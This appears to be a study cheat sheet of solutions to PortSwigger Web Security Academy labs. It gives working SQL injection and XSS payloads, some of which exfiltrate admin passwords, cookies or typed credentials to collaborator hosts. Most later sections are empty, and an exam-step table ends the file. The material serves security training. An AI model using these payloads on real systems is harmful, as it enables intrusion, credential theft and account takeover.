
# Portswigger-Labs

All Apprentice and Practitioner-level Portswigger labs


## 01 - SQL Injection

#### SQLI.01 - SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

```
/filter?category=Gifts'+OR+1=1--
```


#### SQLI.02 - SQL injection vulnerability allowing login bypass

```
password='+or'1'='1
```


#### SQLI.03 - SQL injection UNION attack, determining the number of columns returned by the query

```
/filter?category=Accessories'+union+select+NULL,NULL,NULL--
```


#### SQLI.04 - SQL injection UNION attack, finding a column containing text

```
/filter?category=Accessories'+union+all+select+'0','Qrc0Pq','1234'--
```


#### SQLI.05 - SQL injection UNION attack, retrieving data from other tables

```
/filter?category=Gifts'+union+all+select+username,password+from+users--
```


#### SQLI.06 - SQL injection UNION attack, retrieving multiple values in a single column

```
/filter?category=Gifts'+union+all+select+NULL,CONCAT(username,':',password)+from+users--
```


#### SQLI.07 - SQL injection attack, querying the database type and version on Oracle

```
/filter?category=Gifts'+union+all+select+'1',banner+FROM+v$version-- 
```


#### SQLI.08 - SQL injection attack, querying the database type and version on MySQL and Microsoft

```
/filter?category=Accessories'+union+select+0,@@version;#
```


#### SQLI.09 - SQL injection attack, listing the database contents on non-Oracle databases

```
/filter?category=Gifts'+union+all+select+username_lvfons,password_femvin+from+users_vptjgu--
```


#### SQLI.10 - SQL injection attack, listing the database contents on Oracle

```
/filter?category=Pets'+union+all+select+USERNAME_KIWRQE,PASSWORD_OCABHB+from+USERS_XWRQEE--
```


#### SQLI.11 - Blind SQL injection with conditional responses

```
c' AND SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'),1,1)='a
c' AND SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'),2,1)='a
...
```


#### SQLI.12 - Blind SQL injection with conditional errors

```
COOKIE' AND (SELECT CASE WHEN ((SUBSTR((SELECT password FROM users WHERE username = 'administrator'),1,1))='a') THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a
```


#### SQLI.13 - Blind SQL injection with time delays

```
COOKIE'||pg_sleep(10)--
```


#### SQLI.14 - Blind SQL injection with time delays and information retrieval

```
jIPoq0qYcS0Y2AmF'+||+(SELECT+CASE+WHEN+(SUBSTRING((SELECT+password+FROM+users+WHERE+username='administrator'),1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END)--
```


#### SQLI.15 - Blind SQL injection with out-of-band interaction

```
Cookie: TrackingId=FFyToxqSs49lpxuC'+union+select+EXTRACTVALUE(xmltype('<%3fxml+version="1.0"+encoding="UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://rfawfotutbq6iasl1guon5zd84ev2uqj.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--;
```


#### SQLI.16 - Blind SQL injection with out-of-band data exfiltration

```
mnsyvP6Ci68a0edP'+union+select+EXTRACTVALUE(xmltype('<%3fxml+version="1.0"+encoding="UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://'||(SELECT+password+FROM+users+where+username='administrator')||'.0mntiwqdq98x96mi2d97hujkwb22quej.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
```


#### SQLI.17 - SQL injection with filter bypass via XML encoding.md


```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
	<productId>
		(&#x53;ELECT 1)
	</productId>
	<storeId>
		(&#x53;ELECT 1)
	</storeId>
</stockCheck>
```

```
SELECT CASE WHEN (substring((SELECT password FROM users where username = 'administrator'),1,1)='a') THEN 1 ELSE 2 END


&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x43;&#x41;&#x53;&#x45;&#x20;&#x57;&#x48;&#x45;&#x4e;&#x20;&#x28;&#x73;&#x75;&#x62;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x28;&#x28;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x20;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;&#x20;&#x77;&#x68;&#x65;&#x72;&#x65;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x3d;&#x20;&#x27;&#x61;&#x64;&#x6d;&#x69;&#x6e;&#x69;&#x73;&#x74;&#x72;&#x61;&#x74;&#x6f;&#x72;&#x27;&#x29;&#x2c;&#x31;&#x2c;&#x31;&#x29;&#x3d;&#x27;ZZZZZZZZZZ&#x27;&#x29;&#x20;&#x54;&#x48;&#x45;&#x4e;&#x20;&#x31;&#x20;&#x45;&#x4c;&#x53;&#x45;&#x20;&#x32;&#x20;&#x45;&#x4e;&#x44;
```


## 02 - Cross-Site Scripting

#### XSS.01 - Reflected XSS into HTML context with nothing encoded

```
<script>alert(1)</script>
```


#### XSS.02 - Stored XSS into HTML context with nothing encoded

In "Comment" field:

```
<script>alert(1)</script>
```


#### XSS.03 - DOM XSS in document.write sink using source location.search

Search:

```
"><script>alert(1)</script>
```


#### XSS.04 - DOM XSS in innerHTML sink using source location.search

Search:

```
<img src=x onerror=alert(1) />
```


#### XSS.05 - DOM XSS in jQuery anchor href attribute sink using location.search source

```
/feedback?returnPath=javascript:alert(document.cookie)
```


#### XSS.06 - DOM XSS in jQuery selector sink using a hashchange event

```
<iframe style="width:100%;height:100%" src="https://0ae000fe04dcc1068048c1f000ed005b.web-security-academy.net#" onload="this.src+='<img src=1 onerror=print(1)>'">
```


#### XSS.07 - Reflected XSS into attribute with angle brackets HTML-encoded

Search:

```
" autofocus onfocus=alert(1) x="
```


#### XSS.08 - Stored XSS into anchor href attribute with double quotes HTML-encoded

"Website" field:

```
javascript:alert(1)
```


#### XSS.09 - Reflected XSS into a JavaScript string with angle brackets HTML encoded

Search:

```
';alert(1)//
```


#### XSS.10 - DOM XSS in document.write sink using source location.search inside a select element

```
/product?productId=4&storeId=</option><script>alert(1)</script><option%20selected>
```


#### XSS.11 - DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

```
{{constructor.constructor('alert(1)')()}}

{{$on.constructor('alert(1)')()}}
```


#### XSS.12 - Reflected DOM XSS

```
\"-alert(1)}//
```


#### XSS.13 - Stored DOM XSS

"Comment" field:

```
</p><img src=x onerror=alert(1) /><p>
```


#### XSS.14 - Exploiting cross-site scripting to steal cookies

```
</p><img src=x onerror='document.location="http://s2v2in38mu6tj6w733goro9f066xunic.oastify.com/?cookies="+document.cookie' /><p>
```


#### XSS.15 - Exploiting cross-site scripting to capture passwords

```
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```


#### XSS.16 - Exploiting XSS to perform CSRF

```
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var csrf_token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
  console.log(csrf_token);
  var xhr = new XMLHttpRequest();
  xhr.open("POST", '/my-account/change-email', true);
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  xhr.onreadystatechange = () => { 
    if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
    }
  }
  xhr.send("email=test12@test.com&csrf="+csrf_token);
};
</script>
```


#### XSS.17 - Reflected XSS into HTML context with most tags and attributes blocked

```
<body onresize="print()">

<iframe src="https://0ad100ff04e7e76582e088af00ae0026.web-security-academy.net/?search=%3Cbody+onresize%3Dprint%28%29%3E" height="100%" title="Iframe Example" onload=body.style.width='100%'></iframe>
```


#### XSS.18 - Reflected XSS into HTML context with all tags blocked except custom ones

```
<xss autofocus tabindex=1 onfocus=alert(document.cookie)></xss>

<iframe src="https://0a69008d036aebe780944ee10019004a.web-security-academy.net/?search=%3Cxss+autofocus+tabindex%3D1+onfocus%3Dalert%28document.cookie%29%3E%3C%2Fxss%3E" width="100%" height="100%" title="Iframe Example"></iframe>
```


#### XSS.19 - Reflected XSS with some SVG markup allowed

```
<svg><animatetransform onbegin=alert(1) attributeName=transform>
```


#### XSS.20 - Reflected XSS in canonical link tag

```
/post?postId=1&a=b'accesskey='X'onclick='alert(1)
```


#### XSS.21 - Reflected XSS into a JavaScript string with single quote

```
';</script><img src=x onerror=alert(1)><script>var a='a
```


#### XSS.22 - Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

```
\';alert(1);//
```


#### XSS.23 - Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

```
POST /post/comment HTTP/2
...

csrf=e8yz3UQ62qX7CBfs9PFEanjwdYjzbaMz&postId=1&comment=test1&name=test2&email=test3%40test.com&website=http%3A%2F%2Ftest4.com%26apos;);alert(1)%3b//
```


#### XSS.24 - Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks

```
${alert(1)}
```



## 03 - Cross-site request forgery (CSRF)

01 - CSRF vulnerability with no defenses

```

```


#### CSRF.02 - CSRF where token validation depends on request method

```

```


#### CSRF.03 - CSRF where token validation depends on token being present

```

```


#### CSRF.04 - CSRF where token is not tied to user session

```

```


#### CSRF.05 - CSRF where token is tied to non-session cookie

```

```


#### CSRF.06 - CSRF where token is duplicated in cookie

```

```


#### CSRF.07 - SameSite Lax bypass via method override

```

```


#### CSRF.08 - SameSite Strict bypass via client-side redirect

```

```


#### CSRF.09 - SameSite Strict bypass via sibling domain

```

```


#### CSRF.10 - SameSite Lax bypass via cookie refresh

```

```


#### CSRF.11 - CSRF where Referer validation depends on header being present

```

```


#### CSRF.12 - CSRF with broken Referer validation

```

```



## 04 - Clickjacking



#### CJACK.01 - Basic clickjacking with CSRF token protection

```

```


#### CJACK.02 - Clickjacking with form input data prefilled from a URL parameter

```

```


#### CJACK.03 - Clickjacking with a frame buster script

```

```


#### CJACK.04 - Exploiting clickjacking vulnerability to trigger DOM-based XSS

```

```


#### CJACK.05 - Multistep clickjacking

```

```


## 05 - DOM-based vulnerabilities


#### DOM.01 - DOM XSS using web messages

```

```


#### DOM.02 - DOM XSS using web messages and a JavaScript URL

```

```


#### DOM.03 - DOM XSS using web messages and JSON.parse

```

```


#### DOM.04 - DOM-based open redirection

```

```


#### DOM.05 - DOM-based cookie manipulation

```

```




## 06 - Cross-origin resource sharing (CORS)

#### CORS.01 - CORS vulnerability with basic origin reflection

```

```


#### CORS.02 - CORS vulnerability with trusted null origin

```

```


#### CORS.03 - CORS vulnerability with trusted insecure protocols

```

```



## 07 - XML external entity (XXE) injection

#### XXE.01 - Exploiting XXE using external entities to retrieve files

```

```


#### XXE.02 - Exploiting XXE to perform SSRF attacks

```

```


#### XXE.03 - Blind XXE with out-of-band interaction

```

```


#### XXE.04 - Blind XXE with out-of-band interaction via XML parameter entities

```

```


#### XXE.05 - Exploiting blind XXE to exfiltrate data using a malicious external DTD

```

```


#### XXE.06 - Exploiting blind XXE to retrieve data via error messages

```

```


#### XXE.07 - Exploiting XInclude to retrieve files

```

```


#### XXE.08 - Exploiting XXE via image file upload

```

```



## 08 - Server-side request forgery (SSRF)

#### SSRF.01 - Basic SSRF against the local server

```

```


#### SSRF.02 - Basic SSRF against another back-end system

```

```


#### SSRF.03 - SSRF with blacklist-based input filter

```

```


#### SSRF.04 - SSRF with filter bypass via open redirection vulnerability

```

```


#### SSRF.05 - Blind SSRF with out-of-band detection

```

```



## 09 - HTTP request smuggling

#### HSMU.01 - HTTP request smuggling, basic CL.TE vulnerability

```

```


#### HSMU.02 - HTTP request smuggling, basic TE.CL vulnerability

```

```


#### HSMU.03 - HTTP request smuggling, obfuscating the TE header

```

```


#### HSMU.04 - HTTP request smuggling, confirming a CL.TE vulnerability via differential responses

```

```


#### HSMU.05 - HTTP request smuggling, confirming a TE.CL vulnerability via differential responses

```

```


#### HSMU.06 - Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability

```

```


#### HSMU.07 - Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability

```

```


#### HSMU.08 - Exploiting HTTP request smuggling to reveal front-end request rewriting

```

```


#### HSMU.09 - Exploiting HTTP request smuggling to capture other users' requests

```

```


#### HSMU.10 - Exploiting HTTP request smuggling to deliver reflected XSS

```

```


#### HSMU.11 - Response queue poisoning via H2.TE request smuggling

```

```


#### HSMU.12 - H2.CL request smuggling

```

```


#### HSMU.13 - HTTP2 request smuggling via CRLF injection

```

```


#### HSMU.14 - HTTP2 request splitting via CRLF injection

```

```


#### HSMU.15 - CL.0 request smuggling

```

```


## 10 - OS command injection


#### CINJ.01 - OS command injection, simple case

```

```


#### CINJ.02 - Blind OS command injection with time delays

```

```


#### CINJ.03 - Blind OS command injection with output redirection

```

```


#### CINJ.04 - Blind OS command injection with out-of-band interaction

```

```


#### CINJ.05 - Blind OS command injection with out-of-band data exfiltration


```

```


## 11 - Server-side template injection (SSTI)

#### SSTI.01 - Basic server-side template injection

```

```


#### SSTI.02 - Basic server-side template injection (code context)

```

```


#### SSTI.03 - Server-side template injection using documentation

```

```


#### SSTI.04 - Server-side template injection in an unknown language with a documented exploit

```

```


#### SSTI.05 - Server-side template injection with information disclosure via user-supplied objects

```

```




## 12 - Directory traversal


#### TRAV.01 - File path traversal, simple case

```

```


#### TRAV.02 - File path traversal, traversal sequences blocked with absolute path bypass

```

```


#### TRAV.03 - File path traversal, traversal sequences stripped non-recursively

```

```


#### TRAV.04 - File path traversal, traversal sequences stripped with superfluous URL-decode

```

```


#### TRAV.05 - File path traversal, validation of start of path

```

```


#### TRAV.06 - File path traversal, validation of file extension with null byte bypass

```

```




## 13 - Access control vulnerabilities


#### ACCE.01 - Unprotected admin functionality

```

```


#### ACCE.02 - Unprotected admin functionality with unpredictable URL

```

```


#### ACCE.03 - User role controlled by request parameter

```

```


#### ACCE.04 - User role can be modified in user profile

```

```


#### ACCE.05 - User ID controlled by request parameter

```

```


#### ACCE.06 - User ID controlled by request parameter, with unpredictable user IDs

```

```


#### ACCE.07 - User ID controlled by request parameter with data leakage in redirect

```

```


#### ACCE.08 - User ID controlled by request parameter with password disclosure

```

```


#### ACCE.09 - Insecure direct object references

```

```


#### ACCE.10 - URL-based access control can be circumvented

```

```


#### ACCE.11 - Method-based access control can be circumvented

```

```


#### ACCE.12 - Multi-step process with no access control on one step

```

```


#### ACCE.13 - Referer-based access control

```

```


## 14 - Authentication


#### AUTH.01 - Username enumeration via different responses

```

```


#### AUTH.02 - 2FA simple bypass

```

```


#### AUTH.03 - Password reset broken logic

```

```


#### AUTH.04 - Username enumeration via subtly different responses

```

```


#### AUTH.05 - Username enumeration via response timing

```

```


#### AUTH.06 - Username enumeration via account lock

```

```


#### AUTH.07 - 2FA broken logic

```

```


#### AUTH.08 - Brute-forcing a stay-logged-in cookie

```

```


#### AUTH.09 - Offline password cracking

```

```


#### AUTH.10 - Password reset poisoning via middleware

```

```


#### AUTH.11 - Password brute-force via password change

```

```



## 15 - WebSockets

#### WSOCK.01 - Manipulating WebSocket messages to exploit vulnerabilities

```

```


#### WSOCK.02 - Manipulating the WebSocket handshake to exploit vulnerabilities

```

```


#### WSOCK.03 - Cross-site WebSocket hijacking

```

```




## 16 - Web cache poisoning


#### WCACH.01 - Web cache poisoning with an unkeyed header

```

```


#### WCACH.02 - Web cache poisoning with an unkeyed cookie

```

```


#### WCACH.03 - Web cache poisoning with multiple headers

```

```


#### WCACH.04 - Targeted web cache poisoning using an unknown header

```

```


#### WCACH.05 - Web cache poisoning via an unkeyed query string

```

```


#### WCACH.06 - Web cache poisoning via an unkeyed query parameter

```

```


#### WCACH.07 - Parameter cloaking

```

```


#### WCACH.08 - Web cache poisoning via a fat GET request

```

```


#### WCACH.09 - URL normalization

```

```


## 17 - Insecure deserialization


#### DESE.01 - Modifying serialized objects

```

```


#### DESE.02 - Modifying serialized data types

```

```


#### DESE.03 - Using application functionality to exploit insecure deserialization

```

```


#### DESE.04 - Arbitrary object injection in PHP

```

```


#### DESE.05 - Exploiting Java deserialization with Apache Commons

```

```


#### DESE.06 - Exploiting PHP deserialization with a pre-built gadget chain

```

```


#### DESE.07 - Exploiting Ruby deserialization using a documented gadget chain

```

```




## 18 - Information disclosure

#### INFD.01 - Information disclosure in error messages

```

```


#### INFD.02 - Information disclosure on debug page

```

```


#### INFD.03 - Source code disclosure via backup files

```

```


#### INFD.04 - Authentication bypass via information disclosure

```

```


#### INFD.05 - Information disclosure in version control history

```

```




## 19 - Business logic vulnerabilities

#### BUSL.01 - Excessive trust in client-side controls

```

```


#### BUSL.02 - High-level logic vulnerability

```

```


#### BUSL.03 - Inconsistent security controls

```

```


#### BUSL.04 - Flawed enforcement of business rules

```

```


#### BUSL.05 - Low-level logic flaw

```

```


#### BUSL.06 - Inconsistent handling of exceptional input

```

```


#### BUSL.07 - Weak isolation on dual-use endpoint

```

```


#### BUSL.08 - Insufficient workflow validation

```

```


#### BUSL.09 - Authentication bypass via flawed state machine

```

```


#### BUSL.10 - Infinite money logic flaw

```

```


#### BUSL.11 - Authentication bypass via encryption oracle

```

```




## 20 - HTTP Host header attacks


#### HOST.01 - Basic password reset poisoning

```

```


#### HOST.02 - Host header authentication bypass

```

```


#### HOST.03 - Web cache poisoning via ambiguous requests

```

```


#### HOST.04 - Routing-based SSRF

```

```


#### HOST.05 - SSRF via flawed request parsing

```

```


#### HOST.06 - Host validation bypass via connection state attack

```

```




## 21 - OAuth authentication

#### OAUTH.01 - Authentication bypass via OAuth implicit flow

```

```


#### OAUTH.02 - Forced OAuth profile linking

```

```


#### OAUTH.03 - OAuth account hijacking via redirect_uri

```

```


#### OAUTH.04 - Stealing OAuth access tokens via an open redirect

```

```


#### OAUTH.05 - SSRF via OpenID dynamic client registration

```

```



## 22 - File upload vulnerabilities

#### UPLD.01 - Remote code execution via web shell upload

```

```


#### UPLD.02 - Web shell upload via Content-Type restriction bypass

```

```


#### UPLD.03 - Web shell upload via path traversal

```

```


#### UPLD.04 - Web shell upload via extension blacklist bypass

```

```


#### UPLD.05 - Web shell upload via obfuscated file extension

```

```


#### UPLD.06 - Remote code execution via polyglot web shell upload

```

```



## 23 - JWT

#### JWT.01 - JWT authentication bypass via unverified signature

```

```


#### JWT.02 - JWT authentication bypass via flawed signature verification

```

```


#### JWT.03 - JWT authentication bypass via weak signing key

```

```


#### JWT.04 - JWT authentication bypass via jwk header injection

```

```


#### JWT.05 - JWT authentication bypass via jku header injection

```

```


#### JWT.06 - JWT authentication bypass via kid header path traversal

```

```




## 24 - Essential skills

#### ESSE.01 - Discovering vulnerabilities quickly with targeted scanning

```

```




## 25 - Prototype pollution


#### PROPO.01 - DOM XSS via client-side prototype pollution

```

```


#### PROPO.02 - DOM XSS via an alternative prototype pollution vector

```

```


#### PROPO.03 - Client-side prototype pollution via flawed sanitization

```

```


#### PROPO.04 - Client-side prototype pollution in third-party libraries

```

```


#### PROPO.05 - Client-side prototype pollution via browser APIs

```

```


#### PROPO.06 - Privilege escalation via server-side prototype pollution

```

```


#### PROPO.07 - Detecting server-side prototype pollution without polluted property reflection

```

```


#### PROPO.08 - Bypassing flawed input filters for server-side prototype pollution

```

```


#### PROPO.09 - Remote code execution via server-side prototype pollution

```

```




## Exam steps

Source: [https://micahvandeusen.com/burp-suite-certified-practitioner-exam-review/](https://micahvandeusen.com/burp-suite-certified-practitioner-exam-review/)

| Vulnerability         | S1    | S2    | S3    |
|:---------------------:|:-----:|:-----:|:-----:|
| SQL Injection | | :heavy_check_mark: | :heavy_check_mark: |
| Cross-site scripting | :heavy_check_mark: | :heavy_check_mark: | | 
| Cross-site request forgery (CSRF) | :heavy_check_mark: | :heavy_check_mark: | |
| Clickjacking | :heavy_check_mark: | :heavy_check_mark: | |
| DOM-based vulnerabilities | :heavy_check_mark: | :heavy_check_mark: | |
| Cross-origin resource sharing (CORS) | :heavy_check_mark: | :heavy_check_mark: | |
| XML external entity (XXE) injection | | | :heavy_check_mark: |
| Server-side request forgery (SSRF) | | | :heavy_check_mark: |
| HTTP request smuggling | :heavy_check_mark: | :heavy_check_mark: | |
| OS command injection | | | :heavy_check_mark: |
| Server-side template injection | | | :heavy_check_mark: |
| Directory traversal | | | :heavy_check_mark: |
| Access control vulnerabilities | :heavy_check_mark: | :heavy_check_mark: | |
| Authentication | :heavy_check_mark: | :heavy_check_mark: | |
| Web cache poisoning | :heavy_check_mark: | :heavy_check_mark: | |
| Insecure deserialization | | | :heavy_check_mark: |
| HTTP Host header attacks | :heavy_check_mark: | :heavy_check_mark: | |
| OAuth authentication | :heavy_check_mark: | :heavy_check_mark: | |
| File upload vulnerabilities | | | :heavy_check_mark: | 
| JWT | :heavy_check_mark: | :heavy_check_mark: | |

Step 1:
- Cross-site scripting
- Cross-site request forgery (CSRF)
- Clickjacking
- DOM-based vulnerabilities
- Cross-origin resource sharing (CORS)
- HTTP request smuggling
- Access control vulnerabilities
- Authentication
- Web cache poisoning
- HTTP Host header attacks
- OAuth authentication
- JWT

Step 2:
- SQL Injection
- Cross-site scripting
- Cross-site request forgery (CSRF)
- Clickjacking
- DOM-based vulnerabilities
- Cross-origin resource sharing (CORS)
- HTTP request smuggling
- Access control vulnerabilities
- Authentication
- Web cache poisoning
- HTTP Host header attacks
- OAuth authentication
- JWT

Step 3:
- SQL Injection
- XML external entity (XXE) injection
- Server-side request forgery (SSRF)
- OS command injection
- Server-side template injection
- Directory traversal
- Insecure deserialization
- File upload vulnerabilities
